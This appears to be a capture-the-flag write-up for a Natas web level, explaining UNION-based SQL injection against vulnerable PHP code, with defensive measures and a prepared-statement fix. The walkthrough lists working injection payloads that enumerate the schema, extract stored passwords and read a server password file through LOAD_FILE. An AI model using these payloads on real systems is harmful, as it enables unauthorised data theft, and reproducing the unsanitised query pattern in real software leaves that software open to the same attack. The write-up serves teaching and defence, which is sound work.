// Challenge Overview

This level demonstrates a UNION-based SQL injection vulnerability. The application is vulnerable to SQL injection and returns query results directly, allowing us to use the UNION operator to extract arbitrary data from the database.

// Initial Analysis

View the source code:

<?php $query = "SELECT * FROM users WHERE username='" . $_GET['username'] . "'"; $result = mysql_query($query); while ($row = mysql_fetch_assoc($result)) { echo $row['username'] . ": " . $row['password']; } ?>

The application returns query results directly, making it vulnerable to UNION-based SQL injection.

💡 UNION-based SQL injection allows attackers to combine the results of the original query with additional queries. This is possible when the application displays query results directly.

// Solution Walkthrough

# Extract database name ?username=' UNION SELECT 1,database() -- # Extract table names ?username=' UNION SELECT 1,table_name FROM information_schema.tables -- # Extract column names ?username=' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users' -- # Extract passwords from the users table ?username=' UNION SELECT 1,password FROM users WHERE username='natas28' -- # Read the password file ?username=' UNION SELECT 1,LOAD_FILE('/etc/natas_webpass/natas28') --

// Why It Works

The UNION-based SQL injection works because:

  • Results are displayed: The application shows query results.
  • UNION operator: We can combine results from different queries.
  • No sanitization: User input is not filtered or escaped.
  • Information schema: We can query the database structure.

// Defensive Measures

  • Use prepared statements with parameterized queries.
  • Escape user input using appropriate escaping functions.
  • Limit database permissions — use read-only accounts when possible.
  • Hide database errors from the client.
  • Use input validation and sanitization.

// Secure Code Example

<?php // Using prepared statements $stmt = $db->prepare("SELECT * FROM users WHERE username = ?"); $stmt->bind_param("s", $_GET['username']); $stmt->execute(); $result = $stmt->get_result(); while ($row = $result->fetch_assoc()) { echo $row['username'] . ": " . $row['password']; } ?>

// Key Takeaways

📊 UNION-Based SQL Is Powerful

When query results are displayed, attackers can use UNION to extract any data from the database, including system files.

🛡️ Prepared Statements Are Essential

Parameterized queries prevent SQL injection completely. This should be the standard for all database interactions.
